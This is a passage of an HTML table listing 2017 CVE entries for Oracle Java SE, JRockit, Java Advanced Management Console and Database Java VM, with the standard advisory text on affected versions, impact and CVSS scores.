		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Networking). Supported versions that are affected are Java SE: 6u161, 7u151, 8u144 and 9; Java SE Embedded: 8u144; JRockit: R28.3.15. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded, JRockit. Note: This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10350">CVE-2017-10350</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: JAX-WS). Supported versions that are affected are Java SE: 7u151, 8u144 and 9; Java SE Embedded: 8u144. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10349">CVE-2017-10349</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: JAXP). Supported versions that are affected are Java SE: 6u161, 7u151, 8u144 and 9; Java SE Embedded: 8u144. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10348">CVE-2017-10348</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Libraries). Supported versions that are affected are Java SE: 6u161, 7u151, 8u144 and 9; Java SE Embedded: 8u144. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10347">CVE-2017-10347</a></td>
		<td valign="top">Vulnerability in the Java SE, JRockit component of Oracle Java SE (subcomponent: Serialization). Supported versions that are affected are Java SE: 6u161, 7u151, 8u144 and 9; Java SE Embedded: 8u144. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, JRockit. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, JRockit. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10346">CVE-2017-10346</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Hotspot). Supported versions that are affected are Java SE: 6u161, 7u151, 8u144 and 9; Java SE Embedded: 8u144. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 9.6 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10345">CVE-2017-10345</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Serialization). Supported versions that are affected are Java SE: 6u161, 7u151, 8u144 and 9; Java SE Embedded: 8u144; JRockit: R28.3.15. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded, JRockit. Note: This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 3.1 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10342">CVE-2017-10342</a></td>
		<td valign="top">Vulnerability in the Java Advanced Management Console component of Oracle Java SE (subcomponent: Server). The supported version that is affected is Java Advanced Management Console: 2.7. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java Advanced Management Console. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java Advanced Management Console. CVSS 3.0 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10341">CVE-2017-10341</a></td>
		<td valign="top">Vulnerability in the Java Advanced Management Console component of Oracle Java SE (subcomponent: Server). The supported version that is affected is Java Advanced Management Console: 2.7. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java Advanced Management Console. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java Advanced Management Console accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 3.7 (Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10309">CVE-2017-10309</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Deployment). Supported versions that are affected are Java SE: 8u144 and 9. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE accessible data as well as unauthorized read access to a subset of Java SE accessible data and unauthorized ability to cause a partial denial of service (partial DOS) of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 7.1 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10295">CVE-2017-10295</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Networking). Supported versions that are affected are Java SE: 6u161, 7u151, 8u144 and 9; Java SE Embedded: 8u144; JRockit: R28.3.15. Difficult to exploit vulnerability allows unauthenticated attacker with network access via HTTP to compromise Java SE, Java SE Embedded, JRockit. While the vulnerability is in Java SE, Java SE Embedded, JRockit, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE, Java SE Embedded, JRockit accessible data. Note: This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 4.0 (Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:N/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10293">CVE-2017-10293</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Javadoc). Supported versions that are affected are Java SE: 6u161, 7u151, 8u144 and 9. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Java SE. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java SE accessible data as well as unauthorized read access to a subset of Java SE accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 6.1 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10285">CVE-2017-10285</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: RMI). Supported versions that are affected are Java SE: 6u161, 7u151, 8u144 and 9; Java SE Embedded: 8u144. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 9.6 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10281">CVE-2017-10281</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Serialization). Supported versions that are affected are Java SE: 6u161, 7u151, 8u144 and 9; Java SE Embedded: 8u144; JRockit: R28.3.15. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded, JRockit. Note: This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 5.3 (Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10274">CVE-2017-10274</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Smart Card IO). Supported versions that are affected are Java SE: 6u161, 7u151, 8u144 and 9. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized creation, deletion or modification access to critical data or all Java SE accessible data as well as unauthorized access to critical data or complete access to all Java SE accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 6.8 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10243">CVE-2017-10243</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: JAX-WS). Supported versions that are affected are Java SE: 6u151, 7u141 and 8u131; Java SE Embedded: 8u131; JRockit: R28.3.14. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE, Java SE Embedded, JRockit accessible data and unauthorized ability to cause a partial denial of service (partial DOS) of Java SE, Java SE Embedded, JRockit. Note: This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 6.5 (Confidentiality and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10198">CVE-2017-10198</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Security). Supported versions that are affected are Java SE: 6u151, 7u141 and 8u131; Java SE Embedded: 8u131; JRockit: R28.3.14. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. While the vulnerability is in Java SE, Java SE Embedded, JRockit, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java SE, Java SE Embedded, JRockit accessible data. Note: This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 6.8 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10193">CVE-2017-10193</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Security). Supported versions that are affected are Java SE: 6u151, 7u141 and 8u131; Java SE Embedded: 8u131. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java SE, Java SE Embedded accessible data. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 3.1 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10190">CVE-2017-10190</a></td>
		<td valign="top">Vulnerability in the Java VM component of Oracle Database Server. Supported versions that are affected are 11.2.0.4, 12.1.0.2 and 12.2.0.1. Easily exploitable vulnerability allows high privileged attacker having Create Session, Create Procedure privilege with logon to the infrastructure where Java VM executes to compromise Java VM. While the vulnerability is in Java VM, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java VM. CVSS 3.0 Base Score 8.2 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:L/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10176">CVE-2017-10176</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Security). Supported versions that are affected are Java SE: 7u141 and 8u131; Java SE Embedded: 8u131; JRockit: R28.3.14. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java SE, Java SE Embedded, JRockit accessible data. Note: This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 7.5 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10145">CVE-2017-10145</a></td>
		<td valign="top">Vulnerability in the Java Advanced Management Console component of Oracle Java SE (subcomponent: Server). The supported version that is affected is Java Advanced Management Console: 2.6. Easily exploitable vulnerability allows low privileged attacker with network access via multiple protocols to compromise Java Advanced Management Console. While the vulnerability is in Java Advanced Management Console, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java Advanced Management Console accessible data as well as unauthorized read access to a subset of Java Advanced Management Console accessible data and unauthorized ability to cause a partial denial of service (partial DOS) of Java Advanced Management Console. CVSS 3.0 Base Score 7.4 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:L/A:L).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10135">CVE-2017-10135</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: JCE). Supported versions that are affected are Java SE: 6u151, 7u141 and 8u131; Java SE Embedded: 8u131; JRockit: R28.3.14. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java SE, Java SE Embedded, JRockit accessible data. Note: This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 5.9 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10125">CVE-2017-10125</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: Deployment). Supported versions that are affected are Java SE: 7u141 and 8u131. Difficult to exploit vulnerability allows physical access to compromise Java SE. While the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE. Note: Applies to deployment of Java where the Java Auto Update is enabled. CVSS 3.0 Base Score 7.1 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:P/AC:H/PR:N/UI:N/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10121">CVE-2017-10121</a></td>
		<td valign="top">Vulnerability in the Java Advanced Management Console component of Oracle Java SE (subcomponent: Server). The supported version that is affected is Java Advanced Management Console: 2.6. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Java Advanced Management Console. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java Advanced Management Console, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in unauthorized update, insert or delete access to some of Java Advanced Management Console accessible data as well as unauthorized read access to a subset of Java Advanced Management Console accessible data. CVSS 3.0 Base Score 6.1 (Confidentiality and Integrity impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10118">CVE-2017-10118</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: JCE). Supported versions that are affected are Java SE: 7u141 and 8u131; Java SE Embedded: 8u131; JRockit: R28.3.14. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java SE, Java SE Embedded, JRockit accessible data. Note: This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 7.5 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10117">CVE-2017-10117</a></td>
		<td valign="top">Vulnerability in the Java Advanced Management Console component of Oracle Java SE (subcomponent: Server). The supported version that is affected is Java Advanced Management Console: 2.6. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Java Advanced Management Console. Successful attacks of this vulnerability can result in unauthorized read access to a subset of Java Advanced Management Console accessible data. CVSS 3.0 Base Score 5.3 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10116">CVE-2017-10116</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: Security). Supported versions that are affected are Java SE: 6u151, 7u141 and 8u131; Java SE Embedded: 8u131; JRockit: R28.3.14. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, JRockit, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded, JRockit. Note: This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 8.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10115">CVE-2017-10115</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded, JRockit component of Oracle Java SE (subcomponent: JCE). Supported versions that are affected are Java SE: 6u151, 7u141 and 8u131; Java SE Embedded: 8u131; JRockit: R28.3.14. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded, JRockit. Successful attacks of this vulnerability can result in unauthorized access to critical data or complete access to all Java SE, Java SE Embedded, JRockit accessible data. Note: This vulnerability can be exploited through sandboxed Java Web Start applications and sandboxed Java applets. It can also be exploited by supplying data to APIs in the specified Component without using sandboxed Java Web Start applications or sandboxed Java applets, such as through a web service. CVSS 3.0 Base Score 7.5 (Confidentiality impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10114">CVE-2017-10114</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: JavaFX). Supported versions that are affected are Java SE: 7u141 and 8u131. Difficult to exploit vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 8.3 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10111">CVE-2017-10111</a></td>
		<td valign="top">Vulnerability in the Java SE, Java SE Embedded component of Oracle Java SE (subcomponent: Libraries). The supported version that is affected is Java SE: 8u131; Java SE Embedded: 8u131. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE, Java SE Embedded. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, Java SE Embedded, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE, Java SE Embedded. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 9.6 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10110">CVE-2017-10110</a></td>
		<td valign="top">Vulnerability in the Java SE component of Oracle Java SE (subcomponent: AWT). Supported versions that are affected are Java SE: 6u151, 7u141 and 8u131. Easily exploitable vulnerability allows unauthenticated attacker with network access via multiple protocols to compromise Java SE. Successful attacks require human interaction from a person other than the attacker and while the vulnerability is in Java SE, attacks may significantly impact additional products. Successful attacks of this vulnerability can result in takeover of Java SE. Note: This vulnerability applies to Java deployments, typically in clients running sandboxed Java Web Start applications or sandboxed Java applets, that load and run untrusted code (e.g., code that comes from the internet) and rely on the Java sandbox for security. This vulnerability does not apply to Java deployments, typically in servers, that load and run only trusted code (e.g., code installed by an administrator). CVSS 3.0 Base Score 9.6 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H).

</td>
	</tr>
	<tr>
		<td valign="top" nowrap="nowrap"><a href="https://www.cve.org/CVERecord?id=CVE-2017-10109">CVE-2017-10109</a></td>
